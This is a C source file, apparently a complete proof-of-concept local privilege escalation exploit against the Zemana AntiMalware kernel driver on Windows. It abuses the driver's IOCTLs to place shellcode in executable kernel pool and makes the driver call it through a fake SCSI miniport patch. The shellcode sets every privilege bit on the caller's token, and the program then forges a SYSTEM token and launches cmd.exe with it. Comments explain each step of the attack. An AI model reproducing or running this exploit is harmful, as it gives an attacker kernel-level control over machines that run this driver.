


#define _CRT_SECURE_NO_WARNINGS
#pragma warning( disable:4005 )
#include <Windows.h>
#include <stdio.h>
#include <ntstatus.h>
#include <winternl.h>

#ifndef SE_CREATE_TOKEN_PRIVILEGE
#define SE_CREATE_TOKEN_PRIVILEGE         2L
#define SE_ASSIGNPRIMARYTOKEN_PRIVILEGE   3L
#define SE_LOCK_MEMORY_PRIVILEGE          4L
#define SE_INCREASE_QUOTA_PRIVILEGE       5L
#define SE_MACHINE_ACCOUNT_PRIVILEGE      6L
#define SE_TCB_PRIVILEGE                  7L
#define SE_SECURITY_PRIVILEGE             8L
#define SE_TAKE_OWNERSHIP_PRIVILEGE       9L
#define SE_LOAD_DRIVER_PRIVILEGE         10L
#define SE_SYSTEM_PROFILE_PRIVILEGE      11L
#define SE_SYSTEMTIME_PRIVILEGE          12L
#define SE_PROF_SINGLE_PROCESS_PRIVILEGE 13L
#define SE_INC_BASE_PRIORITY_PRIVILEGE   14L
#define SE_CREATE_PAGEFILE_PRIVILEGE     15L
#define SE_CREATE_PERMANENT_PRIVILEGE    16L
#define SE_BACKUP_PRIVILEGE              17L
#define SE_RESTORE_PRIVILEGE             18L
#define SE_SHUTDOWN_PRIVILEGE            19L
#define SE_DEBUG_PRIVILEGE               20L
#define SE_AUDIT_PRIVILEGE               21L
#define SE_SYSTEM_ENVIRONMENT_PRIVILEGE  22L
#define SE_CHANGE_NOTIFY_PRIVILEGE       23L
#define SE_REMOTE_SHUTDOWN_PRIVILEGE     24L
#define SE_UNDOCK_PRIVILEGE              25L
#define SE_SYNC_AGENT_PRIVILEGE          26L
#define SE_ENABLE_DELEGATION_PRIVILEGE   27L
#define SE_MANAGE_VOLUME_PRIVILEGE       28L
#define SE_IMPERSONATE_PRIVILEGE         29L
#define SE_CREATE_GLOBAL_PRIVILEGE       30L
#endif

#define SystemHandleInformation  0x10
#define SystemBigPoolInformation 0x42

#pragma pack( push, 8 )
typedef struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO {
    USHORT    UniqueProcessId;
    USHORT    CreatorBackTraceIndex;
    UCHAR     ObjectTypeIndex;
    UCHAR     HandleAttributes;
    USHORT    HandleValue;
    ULONG_PTR Object;
    ULONG     GrantedAccess;
} SYSTEM_HANDLE, *PSYSTEM_HANDLE;

typedef struct _SYSTEM_HANDLE_INFORMATION {
    ULONG         HandleCount;
    SYSTEM_HANDLE Handles[ 1 ];
} SYSTEM_HANDLE_INFORMATION, *PSYSTEM_HANDLE_INFORMATION;

typedef struct _SYSTEM_BIGPOOL_ENTRY {
    union {
        ULONG_PTR VirtualAddress;
        ULONG_PTR NonPaged : 1;
    };
    ULONG_PTR SizeInBytes;
    union {
        UCHAR   Tag[ 4 ];
        ULONG   TagULong;
    };
} SYSTEM_BIGPOOL_ENTRY, *PSYSTEM_BIGPOOL_ENTRY;

typedef struct _SYSTEM_BIGPOOL_INFORMATION {
    ULONG                Count;
    SYSTEM_BIGPOOL_ENTRY AllocatedInfo[ 1 ];
} SYSTEM_BIGPOOL_INFORMATION, *PSYSTEM_BIGPOOL_INFORMATION;
#pragma pack( pop )

#pragma pack( push, 1 )
typedef struct _SCSI_ACCESS {
    // PhysicalDrive[X]
    ULONG32 DiskNumber;
    UCHAR   Pad0;

    // SCSI_REQUEST_BLOCK
    UCHAR   PathId;
    UCHAR   TargetId;
    UCHAR   Lun;

    // OffsetHigh must be 0
    // OffsetLow is the sector lba.
    ULONG32 OffsetHigh;
    ULONG32 OffsetLow;

    // Length is truncated when written
    // to the SCSI CDB
    ULONG32 Length;

    // DataTransferLength = Length * Count;
    ULONG32 Count;

    // something to do with protected sectors, when writing.
    //ULONG32 Pad1;
    //ULONG32 SomeFlag;
} SCSI_ACCESS, *PSCSI_ACCESS;

typedef struct _SCSI_MINIPORT_FIX {
    CHAR    DriverName[ 260 ];
    ULONG32 Offset_Func1;
    CHAR    FixCode_Func1[ 128 ];
    ULONG32 Offset_Func2;
    CHAR    FixCode_Func2[ 128 ];
} SCSI_MINIPORT_FIX, *PSCSI_MINIPORT_FIX;
#pragma pack( pop )

NTSTATUS
HandleObjectAddress(
    _In_  HANDLE     Handle,
    _Out_ ULONG_PTR* Object
)
{
    NTSTATUS                   ntStatus;
    ULONG                      Length;
    ULONG                      CurrentHandle;
    ULONG                      ReturnLength;
    PSYSTEM_HANDLE_INFORMATION HandleInfo;

    NTSTATUS( *NtQuerySystemInformation )(
        ULONG,
        PVOID,
        ULONG,
        PULONG ) = ( PVOID )GetProcAddress( GetModuleHandleW( L"ntdll.dll" ), "NtQuerySystemInformation" );

    Length = 0x80000;
    HandleInfo = ( PSYSTEM_HANDLE_INFORMATION )HeapAlloc( GetProcessHeap( ), 0, Length );
    ntStatus = NtQuerySystemInformation( SystemHandleInformation, HandleInfo, Length, &ReturnLength );
    while ( ntStatus == STATUS_INFO_LENGTH_MISMATCH ) {

        Length += 0x80000;
        HandleInfo = ( PSYSTEM_HANDLE_INFORMATION )HeapReAlloc( GetProcessHeap( ), 0, HandleInfo, Length );
        ntStatus = NtQuerySystemInformation( SystemHandleInformation, HandleInfo, Length, &ReturnLength );
    }


    if ( NT_SUCCESS( ntStatus ) ) {

        for ( CurrentHandle = 0; CurrentHandle < HandleInfo->HandleCount; CurrentHandle++ ) {

            if ( HandleInfo->Handles[ CurrentHandle ].UniqueProcessId != GetCurrentProcessId( ) ) {

                continue;
            }

            if ( HandleInfo->Handles[ CurrentHandle ].HandleValue == ( USHORT )( ULONG_PTR )Handle ) {

                *Object = HandleInfo->Handles[ CurrentHandle ].Object;
                HeapFree( GetProcessHeap( ), 0, HandleInfo );
                return STATUS_SUCCESS;
            }
        }

        ntStatus = STATUS_NOT_FOUND;
    }

    *Object = 0;
    HeapFree( GetProcessHeap( ), 0, HandleInfo );
    return ntStatus;
}

NTSTATUS
CreateTokenPrivileged(
    _Out_ PHANDLE NewTokenHandle,
    _In_  HANDLE  CurrentTokenHandle
)
{
    NTSTATUS                 ntStatus;
    LUID                     AuthId = SYSTEM_LUID;
    LARGE_INTEGER            ExpirationTime;
    OBJECT_ATTRIBUTES        ObjectAttributes;
    TOKEN_USER               User;
    TOKEN_OWNER              Owner;
    TOKEN_PRIMARY_GROUP      PrimaryGroup;
    TOKEN_SOURCE             Source;
    PTOKEN_PRIVILEGES        Privileges;
    PTOKEN_GROUPS            Groups;
    SID_IDENTIFIER_AUTHORITY IdEveryoneAuth = SECURITY_WORLD_SID_AUTHORITY;
    SID_IDENTIFIER_AUTHORITY IdNtAuth = SECURITY_NT_AUTHORITY;
    SID_IDENTIFIER_AUTHORITY IdMandatoryAuth = SECURITY_MANDATORY_LABEL_AUTHORITY;
    PSID                     SidEveryone;
    PSID                     SidSystem;
    PSID                     SidAdmin;
    PSID                     SidIntegrity;
    PSID                     SidNtAuth;
    PTOKEN_DEFAULT_DACL      DefaultDacl;
    DWORD                    ReturnLength;

    NTSTATUS( *NtCreateToken )(
        PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, TOKEN_TYPE,
        PLUID, PLARGE_INTEGER, PTOKEN_USER, PTOKEN_GROUPS, PTOKEN_PRIVILEGES,
        PTOKEN_OWNER, PTOKEN_PRIMARY_GROUP, PTOKEN_DEFAULT_DACL, PTOKEN_SOURCE ) = ( PVOID )GetProcAddress( GetModuleHandleW( L"ntdll.dll" ), "NtCreateToken" );

    AllocateAndInitializeSid( &IdNtAuth, 1, SECURITY_LOCAL_SYSTEM_RID, 0, 0, 0, 0, 0, 0, 0, &SidSystem );
    AllocateAndInitializeSid( &IdNtAuth, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &SidAdmin );
    AllocateAndInitializeSid( &IdEveryoneAuth, 1, SECURITY_WORLD_RID, 0, 0, 0, 0, 0, 0, 0, &SidEveryone );
    AllocateAndInitializeSid( &IdMandatoryAuth, 1, SECURITY_MANDATORY_SYSTEM_RID, 0, 0, 0, 0, 0, 0, 0, &SidIntegrity );
    AllocateAndInitializeSid( &IdNtAuth, 1, SECURITY_AUTHENTICATED_USER_RID, 0, 0, 0, 0, 0, 0, 0, &SidNtAuth );

    ExpirationTime.QuadPart = -1;

    AllocateLocallyUniqueId( &Source.SourceIdentifier );
    memcpy( Source.SourceName, "Moe????", 8 );

    PrimaryGroup.PrimaryGroup = SidAdmin;
    User.User.Sid = SidSystem;
    User.User.Attributes = 0;
    Owner.Owner = SidSystem;

    InitializeObjectAttributes( &ObjectAttributes, NULL, 0, 0, NULL );

    Groups = ( PTOKEN_GROUPS )HeapAlloc( GetProcessHeap( ), HEAP_ZERO_MEMORY, sizeof( TOKEN_GROUPS ) + sizeof( LUID_AND_ATTRIBUTES ) * 4 );
    Groups->GroupCount = 4;
    Groups->Groups[ 0 ].Sid = SidAdmin;
    Groups->Groups[ 0 ].Attributes = SE_GROUP_ENABLED | SE_GROUP_ENABLED_BY_DEFAULT | SE_GROUP_OWNER;
    Groups->Groups[ 1 ].Sid = SidEveryone;
    Groups->Groups[ 1 ].Attributes = SE_GROUP_ENABLED | SE_GROUP_ENABLED_BY_DEFAULT | SE_GROUP_MANDATORY;
    Groups->Groups[ 2 ].Sid = SidIntegrity;
    Groups->Groups[ 2 ].Attributes = SE_GROUP_INTEGRITY | SE_GROUP_INTEGRITY_ENABLED;
    Groups->Groups[ 3 ].Sid = SidNtAuth;
    Groups->Groups[ 3 ].Attributes = SE_GROUP_ENABLED | SE_GROUP_ENABLED_BY_DEFAULT | SE_GROUP_MANDATORY;

    Privileges = ( PTOKEN_PRIVILEGES )HeapAlloc( GetProcessHeap( ), HEAP_ZERO_MEMORY, sizeof( TOKEN_PRIVILEGES ) + sizeof( LUID_AND_ATTRIBUTES ) * 4 );
    Privileges->PrivilegeCount = 4;
    Privileges->Privileges[ 0 ].Luid.LowPart = SE_CREATE_TOKEN_PRIVILEGE;
    Privileges->Privileges[ 0 ].Attributes = SE_PRIVILEGE_ENABLED | SE_PRIVILEGE_ENABLED_BY_DEFAULT;
    Privileges->Privileges[ 1 ].Luid.LowPart = SE_TCB_PRIVILEGE;
    Privileges->Privileges[ 1 ].Attributes = SE_PRIVILEGE_ENABLED | SE_PRIVILEGE_ENABLED_BY_DEFAULT;
    Privileges->Privileges[ 2 ].Luid.LowPart = SE_DEBUG_PRIVILEGE;
    Privileges->Privileges[ 2 ].Attributes = SE_PRIVILEGE_ENABLED | SE_PRIVILEGE_ENABLED_BY_DEFAULT;
    Privileges->Privileges[ 3 ].Luid.LowPart = SE_IMPERSONATE_PRIVILEGE;
    Privileges->Privileges[ 3 ].Attributes = SE_PRIVILEGE_ENABLED | SE_PRIVILEGE_ENABLED_BY_DEFAULT;

    GetTokenInformation( CurrentTokenHandle,
                         TokenDefaultDacl,
                         NULL,
                         0,
                         &ReturnLength );

    DefaultDacl = ( PTOKEN_DEFAULT_DACL )HeapAlloc( GetProcessHeap( ), 0, ReturnLength );

    GetTokenInformation( CurrentTokenHandle,
                         TokenDefaultDacl,
                         DefaultDacl,
                         ReturnLength,
                         &ReturnLength );

    ntStatus = NtCreateToken( NewTokenHandle,
                              TOKEN_ALL_ACCESS,
                              &ObjectAttributes,
                              TokenPrimary,
                              &AuthId,
                              &ExpirationTime,
                              &User,
                              Groups,
                              Privileges,
                              &Owner,
                              &PrimaryGroup,
                              DefaultDacl,
                              &Source );
    FreeSid( SidSystem );
    FreeSid( SidAdmin );
    FreeSid( SidEveryone );
    FreeSid( SidIntegrity );
    FreeSid( SidNtAuth );
    HeapFree( GetProcessHeap( ), 0, Groups );
    HeapFree( GetProcessHeap( ), 0, Privileges );
    HeapFree( GetProcessHeap( ), 0, DefaultDacl );

    return ntStatus;
}

void main( ) {

    HANDLE                      DriverHandle;
    DWORD                       ReturnLength;
    BOOL                        Result;
    NTSTATUS                    ntStatus;
    DWORD                       BufferRegisterProcess;
    PSYSTEM_BIGPOOL_INFORMATION Pool;
    ULONG_PTR                   PoolCurrent;
    ULONG_PTR                   PoolCount;
    ULONG_PTR*                  PoolList;
    ULONG_PTR                   PoolListCurrent;
    ULONG                       PoolInfoLength;
    WCHAR                       FsRtlIsNameInExpressionEntry[ 6 ];
    CHAR                        Shellcode[ 4096 - 16 + 4 ];
    ULONG_PTR                   TokenObject;
    HANDLE                      TokenHandle;
    HANDLE                      PrivilegedTokenHandle;
    STARTUPINFOW                InfoStartup;
    PROCESS_INFORMATION         InfoProcess;
    BOOLEAN                     FoundEntry;
    ULONG_PTR                   KernelShellcode;
    SCSI_ACCESS                 ScsiAccess;
    CHAR                        SectorBuffer[ 512 ];

    NTSTATUS( *NtQuerySystemInformation )(
        ULONG,
        PVOID,
        ULONG,
        PULONG ) = ( PVOID )GetProcAddress( GetModuleHandleW( L"ntdll.dll" ), "NtQuerySystemInformation" );

    DriverHandle = CreateFileW( L"\\\\.\\ZemanaAntiMalware",
                                0,
                                0,
                                NULL,
                                OPEN_EXISTING,
                                0,
                                0 );

    if ( DriverHandle == INVALID_HANDLE_VALUE ) {

        printf( "> failed to open a handle to the driver.\n" );
        ExitProcess( 0 );
    }

    printf( "> opened handle to driver: %d.\n", ( int )( ULONG_PTR )DriverHandle );

    if ( !OpenProcessToken( ( HANDLE )-1, TOKEN_ALL_ACCESS, &TokenHandle ) ) {

        printf( "> failed to open a handle to the current process token.\n" );
        CloseHandle( DriverHandle );
        ExitProcess( 0 );
    }

    printf( "> token handle: %d.\n", ( int )( ULONG_PTR )TokenHandle );

    ntStatus = HandleObjectAddress( TokenHandle, &TokenObject );

    if ( !NT_SUCCESS( ntStatus ) ) {

        printf( "> failed to query the token object address.\n" );
        CloseHandle( TokenHandle );
        CloseHandle( DriverHandle );
        ExitProcess( 0 );
    }

    printf( "> token object address: %llx.\n", TokenObject );

    BufferRegisterProcess = GetCurrentProcessId( );

    Result = DeviceIoControl( DriverHandle,
                              0x80002010,
                              &BufferRegisterProcess,
                              sizeof( DWORD ),
                              NULL,
                              0,
                              &ReturnLength,
                              NULL );
    if ( !Result ) {

        printf( "> failed to register process with the driver.\n" );
        CloseHandle( TokenHandle );
        CloseHandle( DriverHandle );
        ExitProcess( 0 );
    }

    printf( "> registered with the driver.\n" );

    PoolInfoLength = 0x80000;
    Pool = ( PSYSTEM_BIGPOOL_INFORMATION )HeapAlloc( GetProcessHeap( ), 0, PoolInfoLength );
    ntStatus = NtQuerySystemInformation( SystemBigPoolInformation,
                                         Pool,
                                         PoolInfoLength,
                                         &ReturnLength );
    while ( ntStatus == STATUS_INFO_LENGTH_MISMATCH ) {

        PoolInfoLength += 0x80000;
        Pool = ( PSYSTEM_BIGPOOL_INFORMATION )HeapReAlloc( GetProcessHeap( ), 0, Pool, PoolInfoLength );
        ntStatus = NtQuerySystemInformation( SystemBigPoolInformation,
                                             Pool,
                                             PoolInfoLength,
                                             &ReturnLength );
    }

    if ( !NT_SUCCESS( ntStatus ) ) {

        printf( "> failed to query SystemBigPoolInformation.\n" );
        HeapFree( GetProcessHeap( ), 0, Pool );
        CloseHandle( TokenHandle );
        CloseHandle( DriverHandle );
        ExitProcess( 0 );
    }

    printf( "> successfully queried SystemBigPoolInformation... saving ANMZ pools.\n" );

    PoolCount = 0;
    for ( PoolCurrent = 0; PoolCurrent < Pool->Count; PoolCurrent++ ) {

        if ( Pool->AllocatedInfo[ PoolCurrent ].TagULong == 'ANMZ' ) {

            PoolCount++;
        }
    }

    if ( PoolCount == 0 ) {

        printf( "> no ANMZ pools found?\n" );
        HeapFree( GetProcessHeap( ), 0, Pool );
        CloseHandle( TokenHandle );
        CloseHandle( DriverHandle );
        ExitProcess( 0 );
    }

    printf( "> found %d ANMZ pools.\n", ( int )PoolCount );

    PoolList = HeapAlloc( GetProcessHeap( ), 0, PoolCount * sizeof( ULONG_PTR ) );

    PoolListCurrent = 0;
    for ( PoolCurrent = 0; PoolCurrent < Pool->Count; PoolCurrent++ ) {

        if ( Pool->AllocatedInfo[ PoolCurrent ].TagULong == 'ANMZ' ) {

            PoolList[ PoolListCurrent++ ] = Pool->AllocatedInfo[ PoolCurrent ].VirtualAddress;
        }
    }

    //
    // This ioctl inserts a string into a linked list of strings, it allocates
    // a UNICODE_STRING structure inside of NonPagedPool which is executable but
    // if the string is already present in the list, the function fails but the
    // driver doesn't free the UNICODE_STRING, the driver will also buffer overflow
    // if we have a string larger than 0x834, inside the "is inserted" function
    // it will go through the linked list and search for a matching entry
    // using FsRtlIsNameInExpression, we insert this so that our shellcode
    // fails to be inserted in the list, but it is still a page large so we can
    // see where it is allocated using NtQuerySystemInformation and SystemBigPoolInformation
    // and we don't buffer overflow & crash the system. *.A is used because this ioctl is for 
    // protecting registry keys from changes and * would protect all registry key changes. 
    // (there is no way to remove an entry). The input parameter is also a structure, the first
    // 4 bytes are unused and our string starts at offset 4.
    //
    // So we build a list of big pool entries with the driver's pool tag and compare the changes
    // to find our BigPool entry.
    //

    FsRtlIsNameInExpressionEntry[ 2 ] = '*';
    FsRtlIsNameInExpressionEntry[ 3 ] = '.';
    FsRtlIsNameInExpressionEntry[ 4 ] = 'A';
    FsRtlIsNameInExpressionEntry[ 5 ] = 0;

    Result = DeviceIoControl( DriverHandle,
                              0x80002040,
                              &FsRtlIsNameInExpressionEntry,
                              sizeof( FsRtlIsNameInExpressionEntry ),
                              &FsRtlIsNameInExpressionEntry,
                              sizeof( FsRtlIsNameInExpressionEntry ),
                              &ReturnLength,
                              NULL );
    if ( !Result ) {

        printf( "> failed to insert FsRtlIsNameInExpression bypass entry.\n" );
        HeapFree( GetProcessHeap( ), 0, PoolList );
        HeapFree( GetProcessHeap( ), 0, Pool );
        CloseHandle( TokenHandle );
        CloseHandle( DriverHandle );
        ExitProcess( 0 );
    }

    printf( "> inserted FsRtlIsNameInExpression bypass entry.\n" );

    //
    // We force the "string" to be at least one page large, 4096-16+4 is
    // because the driver allocates a UNICODE_STRING at the start of the
    // buffer which points to our shellcode and the input buffer starts at
    // offset 4. This means the actual shellcode is placed at KernelShellcode + 16.
    // The buffer is padded with 0xCC because it can't contain 2 consecutive zeroes.
    //

    memset( Shellcode, 0xCC, 4096 - 16 + 4 );

    //
    // Our shellcode, simply pop's rax (this is the return address from the trampoline shellcode)
    // and invokes the debugger, then returns execution as normal.
    //

    // pop rax
    Shellcode[ 4 ] = 0x58;

    // mov rax, TokenObject
    Shellcode[ 5 ] = 0x48;
    Shellcode[ 6 ] = 0xB8;
    *( ULONG64* )( Shellcode + 7 ) = TokenObject;

    // these aren't all necessary, but i forgot which ones are.
    // they all write to _TOKEN._SEP_TOKEN_PRIVILEGES
    // mov qword ptr [rax+0x40], -1
    Shellcode[ 15 ] = 0x48;
    Shellcode[ 16 ] = 0xC7;
    Shellcode[ 17 ] = 0x40;
    Shellcode[ 18 ] = 0x40;
    Shellcode[ 19 ] = 0xFF;
    Shellcode[ 20 ] = 0xFF;
    Shellcode[ 21 ] = 0xFF;
    Shellcode[ 22 ] = 0xFF;

    // mov qword ptr [rax+0x48], -1
    Shellcode[ 23 ] = 0x48;
    Shellcode[ 24 ] = 0xC7;
    Shellcode[ 25 ] = 0x40;
    Shellcode[ 26 ] = 0x48;
    Shellcode[ 27 ] = 0xFF;
    Shellcode[ 28 ] = 0xFF;
    Shellcode[ 29 ] = 0xFF;
    Shellcode[ 30 ] = 0xFF;

    // mov qword ptr [rax+0x50], -1
    Shellcode[ 31 ] = 0x48;
    Shellcode[ 32 ] = 0xC7;
    Shellcode[ 33 ] = 0x40;
    Shellcode[ 34 ] = 0x50;
    Shellcode[ 35 ] = 0xFF;
    Shellcode[ 36 ] = 0xFF;
    Shellcode[ 37 ] = 0xFF;
    Shellcode[ 38 ] = 0xFF;

    // ret
    Shellcode[ 39 ] = 0xC3;

    // our trailing .A is for the FsRtlIsNameInExpressionEntry above.
    Shellcode[ 4096 - 16 + 4 - 6 ] = '.';
    Shellcode[ 4096 - 16 + 4 - 5 ] = 0;
    Shellcode[ 4096 - 16 + 4 - 4 ] = 'A';
    Shellcode[ 4096 - 16 + 4 - 3 ] = 0;

    Shellcode[ 4096 - 16 + 4 - 2 ] = 0;
    Shellcode[ 4096 - 16 + 4 - 1 ] = 0;

    Result = DeviceIoControl( DriverHandle,
                              0x80002040,
                              Shellcode,
                              4096 - 16 + 4,
                              Shellcode,
                              4096 - 16 + 4,
                              &ReturnLength,
                              NULL );
    if ( !Result ) {

        printf( "> failed to insert shellcode entry.\n" );
        HeapFree( GetProcessHeap( ), 0, PoolList );
        HeapFree( GetProcessHeap( ), 0, Pool );
        CloseHandle( TokenHandle );
        CloseHandle( DriverHandle );
        ExitProcess( 0 );
    }

    printf( "> inserted shellcode entry.\n" );

    ntStatus = NtQuerySystemInformation( SystemBigPoolInformation,
                                         Pool,
                                         PoolInfoLength,
                                         &ReturnLength );
    while ( ntStatus == STATUS_INFO_LENGTH_MISMATCH ) {

        PoolInfoLength += 0x80000;
        Pool = ( PSYSTEM_BIGPOOL_INFORMATION )HeapReAlloc( GetProcessHeap( ), 0, Pool, PoolInfoLength );
        ntStatus = NtQuerySystemInformation( SystemBigPoolInformation,
                                             Pool,
                                             PoolInfoLength,
                                             &ReturnLength );
    }

    if ( !NT_SUCCESS( ntStatus ) ) {

        printf( "> failed to query SystemBigPoolInformation.\n" );
        HeapFree( GetProcessHeap( ), 0, PoolList );
        HeapFree( GetProcessHeap( ), 0, Pool );
        CloseHandle( TokenHandle );
        CloseHandle( DriverHandle );
        ExitProcess( 0 );
    }

    printf( "> queried SystemBigPoolInformation for the second time... finding new pool.\n" );

    FoundEntry = TRUE;
    for ( PoolCurrent = 0; PoolCurrent < Pool->Count; PoolCurrent++ ) {

        if ( Pool->AllocatedInfo[ PoolCurrent ].TagULong == 'ANMZ' ) {

            FoundEntry = TRUE;
            for ( PoolListCurrent = 0; PoolListCurrent < PoolCount; PoolListCurrent++ ) {

                FoundEntry = PoolList[ PoolListCurrent ] == Pool->AllocatedInfo[ PoolCurrent ].VirtualAddress;

                if ( FoundEntry ) {

                    break;
                }
            }

            if ( !FoundEntry ) {

                KernelShellcode = Pool->AllocatedInfo[ PoolCurrent ].VirtualAddress & ~1;
                break;
            }
        }
    }

    HeapFree( GetProcessHeap( ), 0, PoolList );
    HeapFree( GetProcessHeap( ), 0, Pool );

    if ( FoundEntry ) {

        printf( "> shellcode allocation, couldn't find BigPool entry.\n" );
        CloseHandle( TokenHandle );
        CloseHandle( DriverHandle );
        ExitProcess( 0 );
    }

    printf( "> shellcode allocated at %llx.\n", KernelShellcode + 16 );

    //
    // 0xD8AB is an offset from the zam64.sys
    // base address, where the only condition is to have a 
    // jump a bit later than this shellcode does, or no jump at all.
    // This will make the driver believe that this function has been 
    // hooked and will attempt to patch it by writing our shellcode to
    // a trampoline and then emulating the same jump. (jmp rel8)
    // The shellcode must have at least one jump which will
    // be "emulated" by the driver, and the jump must be 
    // rel8/rel32 for it to work properly, we make use of self
    // modifying code to "bypass" the drivers disassembler's
    // jump detection.
    //
    // This can be any driver, doesn't have to be zam64, but I used
    // it because it will always be the same.
    //
    // You don't have to do the shellcode allocation part for this vuln
    // to work.
    //

    SCSI_MINIPORT_FIX MiniportFix = {
        "zam64.sys",
        0xD8AB,
    {
        0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov rax, imm64
        0x80, 0x05, 0x01, 0x00, 0x00, 0x00, 0x10,                   // add byte ptr [rip+0], 0x10
        0xFF, 0xC0,                                                 // inc eax -> call rax (after the self-modifying)
        0xEB, 0x00                                                  // jmp rel8 
    } };

    // point the call to it.
    *( ULONG64* )( MiniportFix.FixCode_Func1 + 2 ) = KernelShellcode + 16;

    Result = DeviceIoControl( DriverHandle,
                              0x80002044,
                              &MiniportFix,
                              sizeof( SCSI_MINIPORT_FIX ),
                              &MiniportFix,
                              sizeof( SCSI_MINIPORT_FIX ),
                              &ReturnLength,
                              NULL );
    if ( !Result ) {

        printf( "> failed to install scsi miniport fix, was zam64.sys loaded under a different name?\n" );
        printf( "> attempting with alternate name, zamguard64.sys.\n" );

        strcpy( MiniportFix.DriverName, "zamguard64.sys" );

        Result = DeviceIoControl( DriverHandle,
                                  0x80002044,
                                  &MiniportFix,
                                  sizeof( SCSI_MINIPORT_FIX ),
                                  &MiniportFix,
                                  sizeof( SCSI_MINIPORT_FIX ),
                                  &ReturnLength,
                                  NULL );

        if ( !Result ) {

            printf( "> failed again.\n" );
            CloseHandle( TokenHandle );
            CloseHandle( DriverHandle );
            ExitProcess( 0 );
        }
    }

    printf( "> installed scsi miniport fix... sending scsi access command.\n" );

    //
    // The driver will install the "trampoline" miniport driver fix
    // and then call it, we don't have to do anything in the shellcode because
    // it's a direct call to the handler with no interference by the device stack
    // or need to call IofCompleteRequest.
    //

    ScsiAccess.DiskNumber = 0;
    ScsiAccess.OffsetHigh = 0;
    ScsiAccess.OffsetLow = 0;
    ScsiAccess.Count = 512;
    ScsiAccess.Length = 1;
    ScsiAccess.Lun = 0;
    ScsiAccess.TargetId = 0;
    ScsiAccess.PathId = 0;

    Result = DeviceIoControl( DriverHandle,
                              0x80002018,
                              &ScsiAccess,
                              sizeof( SCSI_ACCESS ),
                              &SectorBuffer,
                              512,
                              &ReturnLength,
                              NULL );

    printf( "> scsi access sent. shellcode should've been executed.\n" );

    //
    // If shellcode was executed successfully then SeCreateTokenPrivilege
    // was granted to us, we can now create a token and pop a shell.
    //

    ntStatus = CreateTokenPrivileged( &PrivilegedTokenHandle,
                                      TokenHandle );

    CloseHandle( TokenHandle );

    if ( !NT_SUCCESS( ntStatus ) ) {

        printf( "> token creation failed? did the shellcode get executed properly? (%x)\n", ntStatus );
        CloseHandle( DriverHandle );
        ExitProcess( 0 );
    }


    memset( &InfoStartup, 0, sizeof( STARTUPINFOW ) );
    memset( &InfoProcess, 0, sizeof( PROCESS_INFORMATION ) );
    InfoStartup.lpDesktop = L"WinSta0\\Default";

    if ( CreateProcessWithTokenW( PrivilegedTokenHandle,
                                  0,
                                  0,
                                  L"cmd.exe",
                                  0,
                                  NULL,
                                  NULL,
                                  &InfoStartup,
                                  &InfoProcess ) ) {

        CloseHandle( InfoProcess.hProcess );
        CloseHandle( InfoProcess.hThread );
        printf( "> launched cmd.exe with a privileged token.\n" );
    }
    else {

        printf( "> failed to launch cmd.exe.\n" );
        CloseHandle( DriverHandle );
        ExitProcess( 0 );
    }

    printf( "> done!\n" );

    CloseHandle( DriverHandle );
    ExitProcess( 0 );
}
